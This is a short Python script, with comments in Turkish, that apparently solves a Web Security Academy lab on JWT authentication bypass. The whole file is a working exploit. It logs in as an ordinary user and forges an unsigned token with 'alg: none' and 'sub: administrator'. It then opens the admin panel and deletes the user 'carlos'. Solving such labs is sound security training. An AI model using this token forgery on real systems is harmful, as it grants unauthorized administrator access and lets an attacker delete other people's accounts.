import requests
import base64
import json

# Lab URL
base_url = "https://0a940068045378ad805dcb3c006d0011.web-security-academy.net"

# 1. Oturum başlat
session = requests.Session()

# 2. Giriş yap
login_url = f"{base_url}/login"
login_data = {"username": "wiener", "password": "peter"}
session.post(login_url, data=login_data)

# 3. JWT token'ı al
account_page = session.get(f"{base_url}/my-account")
token = session.cookies.get("session")

# 4. JWT'yi düzenle: alg=none, sub=administrator
def b64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

new_header = {"alg": "none", "typ": "JWT"}
new_payload = {"sub": "administrator"}

header_encoded = b64url_encode(new_header)
payload_encoded = b64url_encode(new_payload)

# İmzasız JWT oluştur
new_token = f"{header_encoded}.{payload_encoded}."

# Yeni token'ı çerez olarak gönder
cookies = {"session": new_token}

# 5. Admin paneline eriş
admin_page = session.get(f"{base_url}/admin", cookies=cookies)

if "Delete" in admin_page.text:
    print("[+] Admin paneline erişildi!")

    # 6. Carlos'u sil
    delete_url = f"{base_url}/admin/delete?username=carlos"
    delete_response = session.get(delete_url, cookies=cookies)

    if "Congratulations" in delete_response.text:
        print("[+] Carlos silindi! Laboratuvar başarıyla çözüldü.")
    else:
        print("[-] Silme başarisiz.")
else:
    print("[-] Admin paneline erişilemedi.")
